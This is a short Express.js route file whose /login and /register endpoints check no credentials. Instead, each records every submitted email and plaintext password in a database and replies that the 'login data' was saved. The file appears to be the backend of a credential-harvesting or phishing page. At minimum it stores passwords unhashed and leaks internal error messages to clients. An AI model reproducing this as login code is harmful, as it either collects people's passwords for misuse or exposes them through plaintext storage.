const express = require('express');
const User = require('../models/User');

const router = express.Router();

// Save login input only
router.post('/login', async (req, res) => {
  try {
    console.log('Login request received:', { email: req.body.email });
    
    const { email, password } = req.body;
    if (!email || !password) {
      return res.status(400).json({ message: 'Email and password are required' });
    }

    const user = new User({
      type: 'login',
      email,
      password
    });

    const savedUser = await user.save();
    console.log('Login data saved successfully:', savedUser._id);
    
    res.json({
      message: 'Login data saved',
      success: true
    });
  } catch (err) {
    console.error('Login save error:', err.message);
    console.error('Full error:', err);
    res.status(500).json({ message: 'Server error: ' + err.message });
  }
});

// Save signup input only
router.post('/register', async (req, res) => {
  try {
    console.log('Register request received:', { email: req.body.email });
    
    const { email, password } = req.body;
    if (!email || !password) {
      return res.status(400).json({ message: 'Email and password are required' });
    }

    const user = new User({
      type: 'signup',
      email,
      password
    });

    const savedUser = await user.save();
    console.log('Signup data saved successfully:', savedUser._id);

    res.status(201).json({
      message: 'Signup data saved',
      success: true
    });
  } catch (err) {
    console.error('Register save error:', err.message);
    console.error('Full error:', err);
    res.status(500).json({ message: 'Server error: ' + err.message });
  }
});

module.exports = router;
